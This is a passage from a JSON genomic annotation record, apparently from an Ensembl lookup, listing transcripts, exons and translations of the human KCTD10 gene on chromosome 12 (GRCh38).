                    ""Exon"": [
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002212843"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""end"": 109459629,
                            ""seq_region_name"": ""12"",
                            ""version"": 1
                        },
                        {
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109449971,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003552737"",
                            ""version"": 1
                        }
                    ],
                    ""start"": 109449971,
                    ""db_type"": ""core"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000545759"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109459629,
                    ""species"": ""homo_sapiens""
                },
                {
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477359,
                    ""species"": ""homo_sapiens"",
                    ""db_type"": ""core"",
                    ""start"": 109449971,
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000440541"",
                    ""source"": ""havana"",
                    ""Exon"": [
                        {
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109477359,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00000997910"",
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""version"": 7
                        },
                        {
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00003462237"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109469728,
                            ""seq_region_name"": ""12"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""id"": ""ENSE00003470887"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003478591"",
                            ""db_type"": ""core"",
                            ""start"": 109456118
                        },
                        {
                            ""version"": 1,
                            ""start"": 109449971,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003552737"",
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        }
                    ],
                    ""biotype"": ""nonsense_mediated_decay"",
                    ""Translation"": {
                        ""version"": 2,
                        ""length"": 77,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""end"": 109477262,
                        ""Parent"": ""ENST00000440541"",
                        ""id"": ""ENSP00000390321"",
                        ""start"": 109458062,
                        ""db_type"": ""core""
                    },
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""assembly_name"": ""GRCh38"",
                    ""version"": 6,
                    ""display_name"": ""KCTD10-202""
                },
                {
                    ""version"": 5,
                    ""display_name"": ""KCTD10-205"",
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""Translation"": {
                        ""length"": 64,
                        ""version"": 1,
                        ""id"": ""ENSP00000474497"",
                        ""start"": 109471186,
                        ""db_type"": ""core"",
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""Parent"": ""ENST00000537165"",
                        ""end"": 109477262
                    },
                    ""biotype"": ""nonsense_mediated_decay"",
                    ""Exon"": [
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003680955"",
                            ""start"": 109477260,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109477300
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109469515,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002231630"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109471377,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon""
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003684740"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109458081,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002310387""
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        },
                        {
                            ""version"": 1,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003478591"",
                            ""start"": 109456118,
                            ""db_type"": ""core""
                        },
                        {
                            ""version"": 1,
                            ""start"": 109451287,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002301093"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000537165"",
                    ""start"": 109451287,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300
                },
                {
                    ""db_type"": ""core"",
                    ""start"": 109451404,
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000538161"",
                    ""source"": ""havana"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109464895,
                    ""species"": ""homo_sapiens"",
                    ""biotype"": ""protein_coding_CDS_not_defined"",
                    ""Exon"": [
                        {
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109464895,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00002249533"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109464782,
                            ""db_type"": ""core"",
                            ""version"": 1
                        },
                        {
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003684740"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""version"": 1
                        },
                        {
                            ""id"": ""ENSE00003667684"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457992,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""version"": 1
                        },
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00003478591"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109456118
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""db_type"": ""core"",
                            ""start"": 109451404,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002322219"",
                            ""version"": 1
                        }
                    ],
                    ""assembly_name"": ""GRCh38"",
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""strand"": -1,
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""display_name"": ""KCTD10-206"",
                    ""version"": 5
                },
                {
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""assembly_name"": ""GRCh38"",
                    ""version"": 5,
                    ""display_name"": ""KCTD10-211"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109469724,
                    ""id"": ""ENST00000540411"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""start"": 109451595,
                    ""db_type"": ""core"",
                    ""Exon"": [
                        {
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109469724,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002295875"",
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""version"": 1
                        },
                        {
                            ""end"": 109460805,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003651575"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00003475433"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109458078,
                            ""seq_region_name"": ""12""
                        },
                        {
                            ""version"": 1,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00003462325"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457630,
                            ""db_type"": ""core""
                        },
                        {
                            ""id"": ""ENSE00001724937"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109456118,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109456244,
                            ""version"": 1
                        },
                        {
                            ""db_type"": ""core"",
                            ""start"": 109451595,
                            ""id"": ""ENSE00002258038"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        }
                    ],
                    ""Translation"": {
                        ""length"": 287,
                        ""version"": 1,
                        ""id"": ""ENSP00000441672"",
                        ""db_type"": ""core"",
                        ""start"": 109451595,
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""Parent"": ""ENST00000540411"",
                        ""end"": 109469722
                    },
                    ""biotype"": ""protein_coding""
                },
                {
                    ""display_name"": ""KCTD10-215"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""Translation"": {
                        ""id"": ""ENSP00000439481"",
                        ""start"": 109451630,
                        ""db_type"": ""core"",
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""end"": 109456297,
                        ""Parent"": ""ENST00000542954"",
                        ""length"": 121,
                        ""version"": 1
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460395,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002299112"",
                            ""db_type"": ""core"",
                            ""start"": 109460348,
                            ""version"": 1
                        },
                        {
                            ""id"": ""ENSE00003667684"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457992,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109458078,
                            ""seq_region_name"": ""12"",
                            ""version"": 1
                        },
                        {
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003459435""
                        },
                        {
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109451630,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002241511"",
                            ""version"": 1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000542954"",
                    ""db_type"": ""core"",
                    ""start"": 109451630,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109460395
                },
                {
                    ""Translation"": {
                        ""length"": 120,
                        ""version"": 1,
                        ""id"": ""ENSP00000441586"",
                        ""db_type"": ""core"",
                        ""start"": 109451634,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""end"": 109456297,
                        ""Parent"": ""ENST00000535546""
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109458982,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002204564"",
                            ""db_type"": ""core"",
                            ""start"": 109458925,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003667684"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109458078,
                            ""seq_region_name"": ""12""
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109457630
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003459435"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00002290060"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109451634,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""end"": 109451813,
                            ""seq_region_name"": ""12""
                        }
                    ],
                    ""source"": ""havana"",
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000535546"",
                    ""start"": 109451634,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109458982,
                    ""version"": 5,
                    ""display_name"": ""KCTD10-203"",
                    ""assembly_name"": ""GRCh38"",
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens""
                },
                {
                    ""display_name"": ""KCTD10-210"",
                    ""version"": 1,
                    ""assembly_name"": ""GRCh38"",
                    ""strand"": -1,
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""biotype"": ""retained_intron"",
                    ""Exon"": [
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109457975,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""id"": ""ENSE00002270013"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003478591"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""start"": 109451641,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002320356"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon""
                        }
                    ],
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000540402"",
                    ""start"": 109451641,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109457975
                },
                {
                    ""Translation"": {
                        ""Parent"": ""ENST00000540355"",
                        ""end"": 109456297,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""db_type"": ""core"",
                        ""start"": 109451682,
                        ""id"": ""ENSP00000440008"",
                        ""version"": 1,
                        ""length"": 104
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109458871,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109458849,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002211318"",
                            ""version"": 1
                        },
                        {
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003667684"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""version"": 1
                        },
                        {
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109456118,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003459435"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        },
                        {
                            ""start"": 109451682,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00002227701"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000540355"",
                    ""source"": ""havana"",
                    ""start"": 109451682,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109458871,
                    ""display_name"": ""KCTD10-209"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""strand"": -1,
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens""
                },
                {
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477289,
                    ""species"": ""homo_sapiens"",
                    ""db_type"": ""core"",
                    ""start"": 109456222,
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000541077"",
                    ""Exon"": [
                        {
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002308528"",
                            ""end"": 109477289,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109460636,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003543934"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""end"": 109458184,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00002257937"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457992,
                            ""db_type"": ""core""
                        },
                        {
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00002282031"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109456222,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313
                        }
                    ],
                    ""biotype"": ""nonsense_mediated_decay"",
                    ""Translation"": {
                        ""version"": 1,
                        ""length"": 37,
                        ""Parent"": ""ENST00000541077"",
                        ""end"": 109477262,
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""db_type"": ""core"",
                        ""start"": 109460695,
                        ""id"": ""ENSP00000474870""
                    },
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""strand"": -1,
                    ""assembly_name"": ""GRCh38"",
                    ""display_name"": ""KCTD10-212"",
                    ""version"": 1
                },
                {
                    ""Translation"": {
                        ""id"": ""ENSP00000437348"",
                        ""db_type"": ""core"",
                        ""start"": 109456243,
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""Parent"": ""ENST00000542262"",
                        ""end"": 109477262,
                        ""length"": 170,
                        ""version"": 1
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""id"": ""ENSE00002308997"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109477305,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462237"",
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109469728,
                            ""seq_region_name"": ""12"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00003651575"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00003462325"",
                            ""assembly_name"": ""GRCh38""
                        },
                        {
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002322928"",
                            ""start"": 109456243,
                            ""db_type"": ""core"",
                            ""version"": 1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000542262"",
                    ""source"": ""havana"",
                    ""db_type"": ""core"",
                    ""start"": 109456243,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477305,
                    ""display_name"": ""KCTD10-213"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens""
                },
                {
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300,
                    ""species"": ""homo_sapiens"",
                    ""db_type"": ""core"",
                    ""start"": 109456285,
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000542858"",
                    ""source"": ""havana"",
                    ""Exon"": [
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003680955"",
                            ""start"": 109477260,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109477300
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109469728,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""db_type"": ""core"",
                            ""start"": 109469515,
                            ""id"": ""ENSE00003462237"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003651575"",
                            ""db_type"": ""core"",
                            ""start"": 109460636,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""id"": ""ENSE00002297725"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458048,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        },
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462325"",
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12""
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002318671"",
                            ""db_type"": ""core"",
                            ""start"": 109456285
                        }
                    ],
                    ""biotype"": ""protein_coding"",
                    ""Translation"": {
                        ""version"": 1,
                        ""length"": 175,
                        ""end"": 109477262,
                        ""Parent"": ""ENST00000542858"",
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""start"": 109456285,
                        ""db_type"": ""core"",
                        ""id"": ""ENSP00000445129""
                    },
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""MANE"": [],
